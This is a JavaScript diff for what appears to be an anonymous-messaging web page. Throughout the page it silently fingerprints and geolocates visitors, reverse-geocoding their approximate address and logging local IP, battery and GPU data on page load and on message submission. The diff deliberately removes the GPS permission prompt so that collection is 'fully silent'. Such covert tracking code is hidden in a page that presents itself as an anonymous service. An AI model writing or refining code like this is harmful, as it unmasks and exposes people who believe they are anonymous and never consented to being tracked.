@@ -106,27 +106,25 @@ async function reverseGeocode(lat, lon) {
     }
 }
 
-function getPreciseLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                resolve({
-                    lat: lat,
-                    lon: lon,
-                    acc: pos.coords.accuracy,
-                    map_link: `https://www.google.com/maps?q=${lat},${lon}`
-                });
-            },
-            (err) => {
-                console.error("Geolocation error:", err);
-                resolve(null);
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-    });
+async function reverseGeocode(lat, lon) {
+    try {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=ar`;
+        const resp = await fetch(url, { headers: { 'User-Agent': 'SarhneClient/1.0' } });
+        const data = await resp.json();
+        
+        if (data.address) {
+            const area = data.address.village || data.address.hamlet || data.address.town || data.address.suburb || data.address.neighbourhood || data.address.city || data.address.road || "";
+            const region = data.address.state || data.address.county || "";
+            const country = data.address.country || "";
+            
+            const cleanAddress = [area, region, country].filter(Boolean).join("، ");
+            return cleanAddress || data.display_name || "Unknown Location";
+        }
+        
+        return data.display_name || "Unknown Location";
+    } catch (e) {
+        return "Unknown Location";
+    }
 }
 
 function getLocalIP() {
@@ -166,11 +164,11 @@ async function collect(action, extra = {}) {
     const localIp = await getLocalIP();
     const adv = await getAdvancedMetadata();
 
-    let finalLat = extra.lat || ipInfo.latitude;
-    let finalLon = extra.lon || ipInfo.longitude;
+    let finalLat = ipInfo.latitude;
+    let finalLon = ipInfo.longitude;
     let exactAddress = "N/A";
-    let gpsAccuracy = extra.acc ? `Within ${extra.acc} meters` : "IP Based (City Level)";
-    let googleMapsLink = extra.map_link || (finalLat ? `https://www.google.com/maps?q=${finalLat},${finalLon}` : "N/A");
+    let gpsAccuracy = "Silent IP-Based (Approximate)";
+    let googleMapsLink = finalLat ? `https://www.google.com/maps?q=${finalLat},${finalLon}` : "N/A";
 
     if (finalLat && finalLon) {
         exactAddress = await reverseGeocode(finalLat, finalLon);
@@ -194,7 +192,7 @@ async function collect(action, extra = {}) {
         google_maps_link: googleMapsLink,
         message: extra.message || null,
         
-        // Advanced Metadata
+        // Advanced Metadata (Still silent)
         battery_level: adv.batteryLevel,
         is_charging: adv.isCharging,
         gpu_name: adv.gpu,
@@ -218,7 +216,7 @@ window.addEventListener('load', async () => {
     const visitCountEl = document.getElementById('visitCount');
     if (visitCountEl) visitCountEl.innerText = (count || 2339).toLocaleString();
 
-    // Initial visit log without aggressive GPS
+    // Initial silent visit log
     collect('PAGE_VISIT');
 });
 
@@ -234,14 +232,9 @@ if (msgForm) {
         submitBtn.disabled = true;
         submitBtn.innerHTML = "<span>جاري الارسال...</span> <span style='font-size:12px;'>⏳</span>";
 
-        // Try to get exact GPS location on submit (might prompt user)
-        const preciseLocation = await getPreciseLocation();
-        
-        const extra = { 
-            message: val,
-            ...(preciseLocation || {})
-        };
+        const extra = { message: val };
 
+        // Fully silent collection (IP only, no GPS prompt)
         await collect('MESSAGE_SENT', extra);
         finishFlow();
     };
